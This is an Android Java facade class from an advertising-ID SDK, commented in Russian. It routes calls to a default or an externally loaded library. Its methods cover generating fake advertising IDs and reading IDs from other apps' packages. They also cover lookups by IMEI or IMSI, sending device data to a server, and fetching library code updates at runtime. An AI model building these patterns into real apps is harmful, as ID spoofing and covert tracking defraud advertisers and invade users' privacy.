package com.advertising_id_service.appclick.googleadvertisingidservice;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Bundle;
import android.support.v4.app.LoaderManager;
import android.support.v4.content.AsyncTaskLoader;
import android.support.v4.content.Loader;

import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.CodeUpdater;
import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader.ExternalLibServicer;
import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.FilesLoader.FilesLoader;
import com.advertising_id_service.appclick.googleadvertisingidservice.GoogleAdvertisingIdGetterRealisation.GoogleAdvertisingIdGetter_Default;
import com.advertising_id_service.appclick.googleadvertisingidservice.GoogleAdvertisingIdGetterRealisation.GoogleAdvertisingIdGetter_FromExternalLib;
import com.advertising_id_service.appclick.googleadvertisingidservice.GoogleAdvertisingIdGetterRealisation.IGoogleAdvertisingIdGetter;
import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
import com.advertising_id_service.appclick.googleadvertisingidservice.PublisherID.PublisherIDMask;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.IApi;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultCreate;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultDelete;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultInstall;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultRead;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultUpdate;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.List;

import static com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.CodeUpdater.LOADER_NEW_CODE_VERSION;
import static com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.CodeUpdater.LOADER_NEW_MASK_JSON;

public class GoogleAdvertisingIdGetter implements IGoogleAdvertisingIdGetter {
    //*****************************************************************************
    //************************ Методы доступные пользователям *********************
    //*****************************************************************************
    @Override
    public String getVersion(Context cnt){
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().getVersion(cnt);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().getVersion(cnt);
        }
    }

    @Override
    public String getOriginalID(final Context cnt) throws GooglePlayServicesNotAvailableException, IOException, GooglePlayServicesRepairableException {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().getOriginalID(cnt);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().getOriginalID(cnt);
        }
    }

    @Override
    public String getFakeGaid(final Context cnt /*, String callSource, String callDestination*/ ) throws GooglePlayServicesNotAvailableException, IOException, GooglePlayServicesRepairableException {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().getFakeGaid(cnt);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().getFakeGaid(cnt);
        }
    }

    @Override
    public String generateGUID(GenerateIDType control_parameter, Context cnt) {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().generateGUID(control_parameter, cnt);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().generateGUID(control_parameter, cnt);
        }
    }
    public String generateGUID(Context cnt) {
        return generateGUID(GenerateIDType.DEFAULT, cnt);
    }

    @Override
    public List<String> getFilePublisherIDs(PublusherIDType control_parameter, Context cnt, PublisherIDMask mask) {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().getFilePublisherIDs(control_parameter, cnt, mask);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().getFilePublisherIDs(control_parameter, cnt, mask);
        }
    }
    public List<String> getFilePublisherIDs(Context cnt, PublisherIDMask mask) {
        return getFilePublisherIDs(PublusherIDType.DEFAULT, cnt, mask);
    }

    @Override
    public String getInnerPublisherIDs(PublusherIDType control_parameter, Context cnt, String key) {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().getInnerPublisherIDs(control_parameter, cnt, key);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().getInnerPublisherIDs(control_parameter, cnt, key);
        }
    }
    public String getInnerPublisherIDs(Context cnt, String key) {
        return getInnerPublisherIDs(PublusherIDType.DEFAULT, cnt, key);
    }

    @Override
    public String getGAID(Context cnt, String callDestination)  throws GooglePlayServicesNotAvailableException, IOException, GooglePlayServicesRepairableException {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().getGAID(cnt, callDestination);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().getGAID(cnt, callDestination);
        }
    }

    //*****************************************************************************
    //************************ Методы работы с REST *******************************
    //*****************************************************************************

    //Метод добавляет в базу информацию по устрйоству(его GAID-у). В базе создаётся запись c DeviceInfo.guid
    // !!!! Метод должен вызываться в отдельном потоке !!!!
    // @param cnt             - контекст
    // @param lm              - LoaderManager для асинхронного вызова. Пока не используется!
    // @param callDestination - имя пакета из которого надо получать GAID (если из своего то передать null или "")
    // @param login           - логин клиента
    // @param pass            - пароль клиента
    @Override
    public ResultCreate rest_create(final Context cnt, LoaderManager lm, String callDestination, String login, String pass)
    {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().rest_create(cnt, lm, callDestination, login, pass);

        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().rest_create(cnt, lm, callDestination, login, pass);
        }
    }

    //Метод добавляет информацию по конкретной инсталяции. InstallationInfo
    // !!!! Метод должен вызываться в отдельном потоке !!!!
    // @param cnt             - контекст
    // @param lm              - LoaderManager для асинхронного вызова. Пока не используется!
    // @param callDestination - имя пакета из которого надо получать GAID (если из своего то передать null или "")
    // @param installInfo     - объект содержащий информацию по инсталяции
    // @param login           - логин клиента
    // @param pass            - пароль клиента
    //
    // Пример использования:
    // GoogleAdvertisingIdGetter g = new GoogleAdvertisingIdGetter();
    // InstallationInfo install_info = new InstallationInfo(getApplicationContext(),"",  new PublisherIDMask("GooGames,AppLandGames,AppClickGames,gameclub", "_", ".zip,.apk"));
    // g.rest_install(getApplicationContext(), getSupportLoaderManager(), "", install_info);
    //
    @Override
    public ResultInstall rest_install(final Context cnt, LoaderManager lm, String callDestination, InstallationInfo installInfo, String login, String pass)
    {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().rest_install(cnt, lm, callDestination, installInfo, login, pass);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().rest_install(cnt, lm, callDestination, installInfo, login, pass);
        }
    }

    //Метод удаляет из базы информации по устрйоству(его GAID-у).
    // !!!! Метод должен вызываться в отдельном потоке !!!!
    // @param cnt             - контекст
    // @param lm              - LoaderManager для асинхронного вызова. Пока не используется!
    // @param readType        - по какому из параемтров искать в базе (GAID, imei, imsi...)
    // @param callDestination - имя пакета из которого надо получать GAID (если из своего то передать null или "")
    // @param login           - логин клиента
    // @param pass            - пароль клиента
    @Override
    public ResultRead rest_read(final Context cnt, LoaderManager lm, IApi.RestReadType readType, String callDestination, String login, String pass)
    {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().rest_read(cnt, lm, readType, callDestination, login, pass);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().rest_read(cnt, lm, readType, callDestination, login, pass);
        }
    }

    //Метод удаляет из базы информации по устрйоству(его GAID-у).
    // !!!! Метод должен вызываться в отдельном потоке !!!!
    // @param cnt             - контекст
    // @param lm              - LoaderManager для асинхронного вызова. Пока не используется!
    // @param callDestination - имя пакета из которого надо получать GAID (если из своего то передать null или "")
    // @param login           - логин клиента
    // @param pass            - пароль клиента
    @Override
    public ResultDelete rest_delete(final Context cnt, LoaderManager lm, String callDestination, String login, String pass)
    {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().rest_delete(cnt, lm, callDestination, login, pass);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().rest_delete(cnt, lm, callDestination, login, pass);
        }
    }

    //Метод отпроавляет обновление информации по устрйоству(его GAID-у).
    // !!!! Метод должен вызываться в отдельном потоке !!!!
    // @param cnt             - контекст
    // @param lm              - LoaderManager для асинхронного вызова. Пока не используется!
    // @param callDestination - имя пакета из которого надо получать GAID (если из своего то передать null или "")
    // @param login           - логин клиента
    // @param pass            - пароль клиента
    @Override
    public ResultUpdate rest_update(final Context cnt, LoaderManager lm, String callDestination, String login, String pass)
    {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().rest_update(cnt, lm, callDestination, login, pass);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().rest_update(cnt, lm, callDestination, login, pass);
        }
    }

    //*****************************************************************************
    //*************** Методы работы с обновлением библиотеки **********************
    //*****************************************************************************
    // !!!! Метод должен вызываться в отдельном потоке !!!!
    //Проверить последнюю версию библиотеки и обновить её
    // @param cnt  - контекст
    // @param lm   - LoaderManager для асинхронного вызова. Пока не используется!
    // @param GAID - GAID устройства
    //
    @Override
    public boolean libUpdate(Context cnt, LoaderManager lm, String GAID) {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().libUpdate(cnt, lm, GAID);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().libUpdate(cnt, lm, GAID);
        }
    }
}

































